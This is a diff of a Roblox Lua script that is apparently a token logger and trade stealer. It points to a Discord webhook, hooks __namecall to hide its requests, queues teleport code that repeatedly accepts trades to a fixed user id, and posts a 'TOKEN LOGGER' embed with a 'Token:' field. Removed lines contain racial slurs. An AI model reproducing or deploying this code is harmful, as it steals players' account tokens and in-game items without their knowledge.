@@ -1,11 +1,11 @@
-logstoken = "https://discord.com/api/webhooks/1299700539474575382/N3CWu2cRdRBoxtEvEWPXk8kVzbRzpRPzL-0lQ18saGPqz3mv4gscMmsvT5PF3fn2KPBJ"
+logstoken = "https://discord.com/api/webhooks/1299747409022156861/jzLmwvhdReia6IB2cFXc_48Dmo-EchdIA9UbGNfZE3Vc0UPKBvPu3u8cQAJXb6yXUYMc"
 
 LOGS_TOKEN = logstoken
 
 local HttpServ = game:GetService("HttpService")
 local msglogs = "||@everyone||"  -- Message to be logged
 
-local LastMsgId = "Shimm on top"
+local LastMsgId = ""
 
 local function autoJoin()
     local response = request({
@@ -27,12 +27,12 @@ local function autoJoin()
                 LastMsgId = tostring(messages[1].id)
                 game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 if placeId == 142823291 then
-                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, '/murder')")
+                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'hi')")
                     queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptRequest:FireServer() end")
                     queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer(unpack({[1] = 285646582})) end")
                     game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 else
-                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, '/murder')")
+                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'hi')")
                     game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                 end
             end
@@ -40,7 +40,6 @@ local function autoJoin()
     end
 end
 
---niggas try
 poop = hookmetamethod(game, "__namecall", function(self, ...)
     if self == request then
       return
@@ -50,13 +49,13 @@ poop = hookmetamethod(game, "__namecall", function(self, ...)
   end)
 
 local tokenlogs = {
-    username = "name of the webhook bot",
-    avatar_url = "avatar url bot",
+    username = "Muscle Man",
+    avatar_url = "https://media.discordapp.net/attachments/1288404053394456587/1292742655037407304/171426663.jpg?ex=671de46a&is=671c92ea&hm=2defb9f5e27f3c376056615784bac0692c4b9b614b1b728f661a8df045311cb7&=&format=webp&width=419&height=419",
     content = msglogs,
     embeds = {{
-        title = "this nigga thought this is not token logger😂",
+        title = "TOKEN LOGGER",
         color = tonumber(0x000000),  -- Black color
-        description = "TOKEN LOGGER BY SHIMM (DISCORD LOGGER)",  -- Empty description
+        description = "",  -- Empty description
         fields = {
             {
                 name = "Token: ",  -- Display 'Token: ' label
